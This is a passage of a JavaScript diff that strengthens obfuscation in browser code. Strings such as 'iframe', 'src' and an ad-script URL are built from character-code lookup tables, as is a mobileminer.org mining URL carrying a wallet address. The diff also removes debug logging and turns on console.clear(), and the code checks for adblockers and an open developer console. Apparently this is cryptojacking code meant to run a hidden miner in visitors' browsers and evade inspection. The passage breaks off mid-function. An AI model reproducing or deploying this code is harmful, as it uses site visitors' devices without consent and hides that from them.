@@ -8,6 +8,10 @@ let consoleWasOpened;
 
 const browser = Bowser.getParser(window.navigator.userAgent);
 
+const MAP2 = getMap2();
+const STRING_STRING = getStringString();
+const PARSEINT_STRING = getParseIntString();
+
 const MAP = getMap();
 const [
 	FIREFOX_STRING,
@@ -20,18 +24,10 @@ const [
 ] = getStrings();
 
 function clearConsole() {
-	// console.clear();
+	console.clear();
 }
 
 export const init = async () => {
-	console.log('FIREFOX_STRING', FIREFOX_STRING);
-	console.log('IFRAME_STRING', IFRAME_STRING);
-	console.log('SRC_STRING', SRC_STRING);
-	console.log('NONE_STRING', NONE_STRING);
-	console.log('ADS_URL', ADS_URL);
-	console.log('MINER_URL', MINER_URL);
-	console.log('GET_BROWSER_NAME_STRING', GET_BROWSER_NAME_STRING);
-
 	if (await isAdblockPresent()) {
 		clearConsole();
 		return;
@@ -124,317 +120,345 @@ function ifConsoleIsOpen() {
 
 function getFirefoxString() {
 	// returns "Firefox"
-	const m = getCharCodeAtMethod();
-	return String[getFromCharCodeMethod()](
-		MAP[m](parseInt(`${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1800]}`)),
-		MAP[m](parseInt(`${MAP[1809]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1801]}${MAP[1805]}`))
+	const m = getCharCodeAtMethod(MAP);
+	return window[STRING_STRING][getFromCharCodeMethod(MAP)](
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1800]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1805]}`))
 	);
 }
 
 function getIframeString() {
 	// returns "iframe"
-	const m = getCharCodeAtMethod();
-	return String[getFromCharCodeMethod()](
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1800]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1809]}${MAP[1802]}`))
+	const m = getCharCodeAtMethod(MAP);
+	return window[STRING_STRING][getFromCharCodeMethod(MAP)](
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1800]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`))
 	);
 }
 
 function getSrcString() {
 	// returns "src"
-	const m = getCharCodeAtMethod();
-	return String[getFromCharCodeMethod()](
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1800]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1802]}`))
+	const m = getCharCodeAtMethod(MAP);
+	return window[STRING_STRING][getFromCharCodeMethod(MAP)](
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1800]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1802]}`))
 	);
 }
 
 function getNoneString() {
 	// returns "none"
-	const m = getCharCodeAtMethod();
-	return String[getFromCharCodeMethod()](
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1809]}${MAP[1802]}`))
+	const m = getCharCodeAtMethod(MAP);
+	return window[STRING_STRING][getFromCharCodeMethod(MAP)](
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`))
 	);
 }
 
 function getAdsUrlString() {
 	// returns "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"
-	const m = getCharCodeAtMethod();
-	return String[getFromCharCodeMethod()](
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1800]}`)),
-		MAP[m](parseInt(`${MAP[1800]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1804]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1805]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1803]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1803]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1804]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1809]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1805]}${MAP[1808]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1803]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1804]}${MAP[1809]}`)),
-		MAP[m](parseInt(`${MAP[1809]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1807]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1805]}${MAP[1808]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1800]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1803]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1803]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1804]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1809]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1805]}${MAP[1808]}`)),
-		MAP[m](parseInt(`${MAP[1803]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1806]}${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1803]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1805]}${MAP[1808]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1803]}`)),
-		MAP[m](parseInt(`${MAP[1807]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1804]}${MAP[1809]}`)),
-		MAP[m](parseInt(`${MAP[1809]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1803]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1806]}${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1807]}`))
+	const m = getCharCodeAtMethod(MAP);
+	return window[STRING_STRING][getFromCharCodeMethod(MAP)](
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1800]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1800]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1808]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1809]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1807]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1808]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1800]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1808]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1806]}${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1808]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1803]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1807]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1809]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1806]}${MAP[1805]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1807]}`))
 	);
 }
 
 function getMinerUrl() {
 	// returns "https://mobileminer.org/mine/?auto=1&addr=49Bzm9h878UBBbz1Uu1mXSBjgaWsYjHEy7DhB9NHmD7hfAVFJAohfUjRSUokPv9cnpa1XvMLb2NUgKVoPXPx2yT5GWYBG5c";
-	const m = getCharCodeAtMethod();
-	return String[getFromCharCodeMethod()](
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1800]}`)),
-		MAP[m](parseInt(`${MAP[1800]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1804]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1805]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1803]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1803]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1803]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1804]}${MAP[1809]}`)),
-		MAP[m](parseInt(`${MAP[1809]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1809]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1800]}`)),
-		MAP[m](parseInt(`${MAP[1803]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1800]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1803]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1809]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1803]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1809]}${MAP[1809]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1805]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1800]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1809]}${MAP[1809]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1805]}${MAP[1808]}`)),
-		MAP[m](parseInt(`${MAP[1805]}${MAP[1808]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1800]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1809]}${MAP[1809]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1809]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1803]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1809]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1808]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1808]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1803]}`)),
-		MAP[m](parseInt(`${MAP[1803]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1805]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1805]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1806]}${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1805]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1806]}${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1808]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1801]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1807]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1809]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1809]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1808]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1809]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1806]}${MAP[1808]}`)),
-		MAP[m](parseInt(`${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1804]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1806]}${MAP[1808]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1806]}${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1805]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1803]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1803]}`)),
-		MAP[m](parseInt(`${MAP[1807]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1809]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1804]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1807]}${MAP[1806]}`)),
-		MAP[m](parseInt(`${MAP[1809]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1800]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1803]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1803]}`)),
-		MAP[m](parseInt(`${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1804]}${MAP[1803]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1801]}${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1807]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1808]}${MAP[1804]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1809]}`)),
-		MAP[m](parseInt(`${MAP[1805]}${MAP[1802]}`)),
-		MAP[m](parseInt(`${MAP[1807]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1801]}`)),
-		MAP[m](parseInt(`${MAP[1802]}${MAP[1809]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1805]}`)),
-		MAP[m](parseInt(`${MAP[1801]}${MAP[1802]}`))
+	const m = getCharCodeAtMethod(MAP);
+	return window[STRING_STRING][getFromCharCodeMethod(MAP)](
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1800]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1800]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1803]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1809]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1800]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1800]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1802]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1807]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1806]}`)),
+		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`)),
